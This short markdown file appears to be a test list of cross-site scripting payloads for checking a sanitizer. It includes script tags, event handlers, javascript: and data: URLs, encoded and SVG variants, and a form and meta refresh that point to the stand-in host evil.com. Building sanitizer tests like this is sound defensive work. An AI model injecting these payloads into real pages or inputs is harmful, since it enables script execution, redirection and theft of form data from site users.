# XSS Attack Vectors

Inline script: <script>alert('xss')</script>

Event handler: <img src=x onerror="alert('xss')">

JavaScript URL: [click me](javascript:alert('xss'))

Data URL: <a href="data:text/html,<script>alert('xss')</script>">link</a>

Encoded: <img src="x" onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;xss&#39;&#41;">

SVG injection: <svg onload="alert('xss')">

Nested: <div><iframe src="javascript:alert('xss')"></iframe></div>

Style injection: <div style="background:url('javascript:alert(1)')">styled</div>

Form hijack: <form action="https://evil.com"><input type="submit"></form>

Meta refresh: <meta http-equiv="refresh" content="0;url=https://evil.com">
